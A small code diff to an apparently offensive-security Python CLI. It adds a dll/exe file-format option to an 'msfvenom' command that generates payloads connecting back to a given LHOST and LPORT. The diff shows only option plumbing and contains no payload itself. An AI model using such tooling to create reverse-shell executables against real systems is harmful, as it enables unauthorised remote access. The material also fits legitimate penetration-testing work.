@@ -53,12 +53,13 @@ def nc(ctx: Context, port):
 @cli.command()
 @click.option('-d', '--host', type=str, help='LHOST to connect back', required=True)
 @click.option('-p', '--port', type=int, help='LPORT to connect back', required=True)
+@click.option('-f', '--format', type=click.Choice(['dll', 'exe']), help='what file type to create [dll]', default='dll')
 @click.pass_context
-def msfvenom(ctx: Context, host, port):
+def msfvenom(ctx: Context, host, port, format):
     '''MSFVENOM creator'''
     hack: ToolService = ctx.obj.hack
     try:
-        hack.msfvenom(host=host, port=port)
+        hack.msfvenom(host=host, port=port, format=format)
     except KeyboardInterrupt as k:
         hack.utils.logging.debug(f"process interupted! ({k})")
         sys.exit(5)
